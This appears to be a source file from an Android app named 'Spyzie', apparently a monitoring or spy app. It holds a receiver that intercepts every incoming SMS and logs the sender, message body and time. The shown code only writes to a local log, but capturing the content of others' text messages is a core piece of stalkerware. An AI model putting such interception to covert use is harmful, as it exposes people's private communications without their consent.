package com.tantd.spyzie.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.tantd.spyzie.util.Constants;

import java.util.Date;

public class SpyzieReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        for (int i = 0; i < pdus.length; i++) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            String message = "Sender: " + smsMessage.getDisplayOriginatingAddress()
                    + ", Display message body: " + smsMessage.getDisplayMessageBody()
                    + ", Time: " + new Date(smsMessage.getTimestampMillis())
                    + ", Message: " + smsMessage.getMessageBody();
            Log.d(Constants.LOG_TAG, message);
        }
    }
}
